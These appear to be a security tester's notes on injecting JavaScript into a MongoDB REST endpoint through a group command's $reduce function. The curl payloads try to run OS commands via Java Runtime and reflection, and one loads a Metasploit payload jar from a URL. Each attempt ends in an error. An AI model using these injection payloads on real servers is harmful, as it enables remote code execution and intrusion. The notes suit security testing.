

# Direct access to Runtime
new java.lang.Runtime.getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')

curl http://localhost:27080/foo/_cmd --data 'cmd={"group" : {"ns" : "geo", "$reduce" : "function(obj, prev) {new java.lang.Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\")}", "key" : {"x" : 1}, "initial" : {"count":0}}}'

Mon Feb 17 18:29:18.511 ReferenceError: java is not defined

# Reflection way 1
db.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("/Applications/Calculator.app/Contents/MacOS/Calculator")

curl http://localhost:27080/foo/_cmd --data 'cmd={"group" : {"ns" : "geo", "$reduce" : "function(obj, prev) {db.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\")}", "key" : {"x" : 1}, "initial" : {"count":0}}}'

Mon Feb 17 18:29:58.322 TypeError: Property 'getClass' of object test is not a function

# Reflection way 2

db['class'].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("/Applications/Calculator.app/Contents/MacOS/Calculator")

curl http://localhost:27080/foo/_cmd --data 'cmd={"group" : {"ns" : "geo", "$reduce" : "function(obj, prev) {db['class'].forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\")}", "key" : {"x" : 1}, "initial" : {"count":0}}}'

Mon Feb 17 18:30:25.896 TypeError: Property 'forName' of object test.class is not a function

# URLClassLoader
new URLClassLoader(new URL[]{new URL("http://localhost/~alvaro/met.jar")}).loadClass("metasploit.Payload").newInstance()
new URLClassLoader(new URL[]{new URL(\"http://localhost/~alvaro/met.jar\")}).loadClass(\"metasploit.Payload\").newInstance()

curl http://localhost:27080/foo/_cmd --data 'cmd={"group" : {"ns" : "geo", "$reduce" : "function(obj, prev) {var str = new java.lang.String(\"http://localhost/~alvaro/met.jar\");var url = new java.net.URL(str); var array = [url]; var cl = new java.lang.URLClassLoader(array);}", "key" : {"x" : 1}, "initial" : {"count":0}}}'


TypeError: [JavaPackage java.net.URL] is not a function, it is object.



